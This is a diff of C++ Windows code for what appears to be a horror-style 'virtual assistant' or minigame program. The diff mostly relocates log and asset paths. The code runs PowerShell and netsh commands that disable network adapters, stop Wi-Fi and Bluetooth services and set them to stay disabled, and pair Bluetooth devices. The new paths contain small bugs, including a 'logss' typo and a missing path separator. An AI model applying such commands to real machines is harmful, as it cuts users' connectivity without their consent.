@@ -1,8 +1,8 @@
-#include "main.h"
-#include "utils.h"
-#include "VirtualAssistant.h"
-#include "Minigame.h"
-#include "load.h"
+#include <main.h>
+#include <utils.h>
+#include <core/VirtualAssistant.h>
+#include <minigames/Minigame.h>
+#include <core/load.h>
 #include <iostream>
 #include <windows.h>
 #include <fstream>
@@ -82,8 +82,7 @@ void execute_welcome_sequence() {
 }
 
 void enable_airplane_mode() {
-    const char* temp_log = "C:/Windows/Temp/airplane_log.txt";
-    const char* embed_log = "Data/Mono/etc/EmbedRuntime/airplane_log.txt";
+    const char* embed_log = "resources/logs/airplane_log.txt";
 
     int regResult = system(
         "powershell -Command \""
@@ -99,9 +98,7 @@ void enable_airplane_mode() {
         "}\""
     );
 
-    ofstream log_temp(temp_log, ios::app);
     ofstream log_embed(embed_log, ios::app);
-    log_temp << "Registry update result: " << regResult << endl << flush;
     log_embed << "Registry update result: " << regResult << endl << flush;
 
     const vector<string> interfaces = {
@@ -113,11 +110,8 @@ void enable_airplane_mode() {
     for (const auto& iface : interfaces) {
         string cmd = "netsh interface set interface \"" + iface + "\" admin=disable";
         int result = system(cmd.c_str());
-        log_temp << iface << " disable: " << result << endl << flush;
         log_embed << iface << " disable: " << result << endl << flush;
     }
-
-    log_temp.close();
     log_embed.close();
 
     system(
@@ -125,7 +119,7 @@ void enable_airplane_mode() {
         "Get-Service -Name 'WlanSvc', 'BthServ' | "
         "Stop-Service -Force -PassThru -ErrorAction SilentlyContinue | "
         "Set-Service -StartupType Disabled -PassThru | "
-        "Out-File -Append C:/Windows/Temp/airplane_log.txt -Append Data/Mono/etc/EmbedRuntime/airplane_log.txt"
+        "Out-File -Append resources/logss/airplane_log.txt"
         "\""
     );
 }
@@ -136,16 +130,13 @@ void activate_bluetooth() {
     GetModuleFileNameA(NULL, currentDir, MAX_PATH);
     string exePath(currentDir);
     size_t lastSlash = exePath.find_last_of("/\\");
-    string toolPath = "\"" + exePath.substr(0, lastSlash) + "/Tools/devcon.exe\"";
+    string toolPath = "\"" + exePath.substr(0, lastSlash) + "resources/Tools/devcon.exe\"";
 
-    const char* temp_log = "C:/Windows/Temp/bluetooth_log.txt";
-    const char* embed_log = "Data/Mono/etc/EmbedRuntime/bluetooth_log.txt";
-    ofstream log_temp(temp_log, ios::app);
+    const char* embed_log = "resources/logs/bluetooth_log.txt";
     ofstream log_embed(embed_log, ios::app);
 
     DWORD attrib = GetFileAttributesA(toolPath.c_str());
     if (attrib == INVALID_FILE_ATTRIBUTES) {
-        log_temp << "ERROR: devcon.exe not found at: " << toolPath << endl << flush;
         log_embed << "ERROR: devcon.exe not found at: " << toolPath << endl << flush;
         return;
     }
@@ -159,19 +150,16 @@ void activate_bluetooth() {
         "Start-Service -Name 'BTAGService' -ErrorAction SilentlyContinue;"
         "Start-Sleep -Seconds 3;"
         "Add-BluetoothDevice -Name '*' -ErrorAction SilentlyContinue | "
-        "Out-File -Append " + string(temp_log) + " -Append " + string(embed_log) + "\""
+        "Out-File -Append " + string(embed_log) + "\""
     };
 
     for (const auto& cmd : commands) {
-        log_temp << "Executing: " << cmd << endl << flush;
         log_embed << "Executing: " << cmd << endl << flush;
         int result = system(cmd.c_str());
-        log_temp << "Result: " << result << endl << flush;
         log_embed << "Result: " << result << endl << flush;
     }
 
     system("netsh interface set interface \"Bluetooth Network Connection\" admin=enable");
-    log_temp.close();
     log_embed.close();
 }
 
@@ -183,7 +171,7 @@ bool file_exists(const char* path) {
 }
 
 void play_creepy_audio() {
-    const char* soundPath = "Data/Mono/etc/mono/scripts/c1337.mp3";
+    const char* soundPath = "resources/audio/c1337.mp3";
     if (file_exists(soundPath)) {
         play_mp3(soundPath);
         mciSendStringA("status mp3file length", NULL, 0, NULL);
